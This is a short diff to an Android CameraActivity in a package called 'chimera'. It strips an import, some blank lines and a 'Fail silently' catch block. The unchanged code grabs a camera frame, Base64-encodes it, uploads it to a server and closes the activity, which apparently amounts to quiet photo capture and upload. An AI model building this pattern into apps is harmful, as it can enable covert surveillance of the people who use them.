@@ -1,13 +1,11 @@
 package com.chimera;
 
 import android.Manifest;
-import android.annotation.SuppressLint;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
-
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.camera.core.CameraSelector;
@@ -16,14 +14,12 @@ import androidx.camera.core.ImageCaptureException;
 import androidx.camera.core.ImageProxy;
 import androidx.camera.lifecycle.ProcessCameraProvider;
 import androidx.core.content.ContextCompat;
-
 import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.common.util.concurrent.ListenableFuture;
-
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -78,8 +74,6 @@ public class CameraActivity extends AppCompatActivity {
                     buffer.get(bytes);
                     String encodedImage = Base64.encodeToString(bytes, Base64.DEFAULT);
                     uploadFileToServer("picture", encodedImage);
-                } catch (Exception e) {
-                    // Fail silently
                 } finally {
                     image.close();
                     finish();
